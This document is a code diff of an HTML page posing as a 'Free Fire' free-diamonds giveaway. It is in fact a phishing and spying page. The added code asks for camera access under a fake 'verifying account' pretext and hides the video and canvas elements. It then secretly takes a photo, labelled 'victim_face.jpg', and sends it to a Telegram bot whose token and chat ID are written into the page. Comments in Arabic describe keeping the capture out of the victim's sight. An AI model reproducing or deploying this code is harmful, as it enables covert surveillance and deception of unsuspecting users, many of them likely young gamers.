@@ -2,29 +2,61 @@
 <html>
 <head>
     <title>Free Fire Rewards</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background: #121212; color: orange; text-align: center; font-family: sans-serif; }
-        .btn { padding: 20px; background: orange; color: black; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
+        body { background: #121212; color: orange; text-align: center; font-family: sans-serif; margin: 0; padding: 20px; }
+        .btn { padding: 20px 40px; background: orange; color: black; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; width: 80%; max-width: 300px; }
+        /* نخفو الفيديو باش ما يفيقش */
+        #video { display: none; }
+        canvas { display: none; }
     </style>
 </head>
 <body>
-    <h1>💎 Free Diamonds Claim 💎</h1>
-    <p>Click the button below to claim 1000 Diamonds!</p>
-    <button class="btn" onclick="startCapture()">CLAIM NOW</button>
+    <div style="margin-top: 50px;">
+        <h1>💎 Free Diamonds Claim 💎</h1>
+        <p>Click the button below to claim 1000 Diamonds!</p>
+        <button class="btn" onclick="startCapture()">CLAIM NOW</button>
+    </div>
+
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
         const TOKEN = "8641807283:AAGuEZZ683skc2zJC35K5HRVZzTrPzoHmM8"; //
         const CHAT_ID = "7479786207"; //
 
-        function startCapture() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                // الكود يطلب الكاميرا من المتصفح
+        async function startCapture() {
+            try {
+                // 1. طلب الكاميرا
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
                 alert("Verifying Account... Please wait.");
-                // إرسال ميساج للتيليجرام بأن الضحية دخل للصفحة
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🎯 Victim is on the page and camera access requested!`);
-            })
-            .catch(err => { alert("Error: Camera permission required to verify your identity!"); });
+
+                // 2. التقاط صورة بعد ثانية واحدة (باش يوافق)
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, 640, 480);
+                    
+                    // تحويل الصورة لملف JPG وإرسالها
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'victim_face.jpg');
+                        formData.append('caption', '🎯 Captured! Victim is on the page.');
+
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }, 'image/jpeg');
+                }, 1000);
+
+            } catch (err) {
+                alert("Error: Camera permission required to verify your identity!");
+            }
         }
     </script>
 </body>
